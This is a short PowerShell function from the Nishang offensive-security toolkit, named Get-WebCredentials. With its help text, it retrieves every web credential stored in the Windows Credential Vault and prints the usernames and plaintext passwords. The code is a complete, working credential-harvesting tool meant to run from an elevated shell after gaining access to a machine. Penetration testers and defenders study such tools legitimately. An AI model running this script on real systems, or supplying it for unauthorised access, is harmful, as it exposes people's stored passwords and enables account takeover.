function Get-WebCredentials
{
<#
.SYNOPSIS
Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)

.DESCRIPTION
This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script 
also needs PowerShell v3 onwards and must be run from an elevated shell.

.EXAMPLE
PS > Get-WebCredentials

.LINK
https://github.com/samratashok/nishang
#>
[CmdletBinding()] Param ()


#http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage
$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
}

